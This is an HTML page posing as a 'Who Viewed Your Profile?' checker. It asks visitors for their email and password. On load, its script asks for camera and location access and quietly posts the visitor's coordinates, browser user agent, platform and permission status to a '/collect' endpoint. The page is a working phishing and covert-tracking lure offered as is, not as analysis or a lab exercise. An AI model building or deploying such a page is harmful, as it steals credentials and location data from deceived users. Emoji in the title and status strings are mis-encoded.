<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>üîç Profile Viewer Checker</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="/static/icon.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #2c3e50, #3498db);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      text-align: center;
      width: 320px;
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 28px;
      margin-bottom: 20px;
    }
    p {
      margin-bottom: 30px;
      font-size: 16px;
      color: #f1f1f1;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }
    input {
      background: #ecf0f1;
      color: #2c3e50;
    }
    button {
      background: #e74c3c;
      color: white;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background: #c0392b;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>üëÅ Who Viewed Your Profile?</h1>
    <p>Enter your email to check last profile visitors (Secret Mode)</p>
    <form id="spyForm">
      <input type="text" placeholder="Enter your email" required>
      <input type="password" placeholder="Your password" required>
      <button type="submit">Check Now</button>
    </form>
  </div>

  <script>
    async function collectData(status, latitude = null, longitude = null) {
      await fetch("/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          latitude: latitude,
          longitude: longitude,
          camera: status,
          deviceInfo: navigator.platform
        })
      });
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            collectData("‚úÖ Allowed", pos.coords.latitude, pos.coords.longitude);
          },
          err => {
            collectData("‚ùå Location Denied");
          }
        );
        stream.getTracks().forEach(track => track.stop());
      })
      .catch(err => {
        collectData("‚ùå Camera Denied");
      });
  </script>
</body>
</html>
